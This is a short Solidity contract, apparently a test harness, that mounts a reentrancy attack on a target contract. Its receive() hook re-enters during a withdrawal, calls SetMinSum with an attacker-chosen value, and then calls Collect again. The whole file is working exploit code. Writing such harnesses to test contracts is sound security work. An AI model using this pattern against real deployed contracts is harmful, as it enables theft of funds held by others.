// Adversarial reentrant caller: on receive (during Collect's call) it calls SetMinSum
contract ReenterAttacker {
    C public target;
    bool private reentered;
    uint256 private _am;
    uint256 private _newMin;

    constructor(address _target) {
        target = C(_target);
    }

    function put() external payable {
        target.Put{value: msg.value}(0);
    }

    function collect(uint256 am, uint256 newMin) external {
        _am = am;
        _newMin = newMin;
        reentered = false;
        target.Collect(am);
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            // Reentrant call: change MinSum to attacker-chosen value
            target.SetMinSum(_newMin);
            // Optionally Collect again to meet the balance condition
            target.Collect(_am);
        }
    }
}

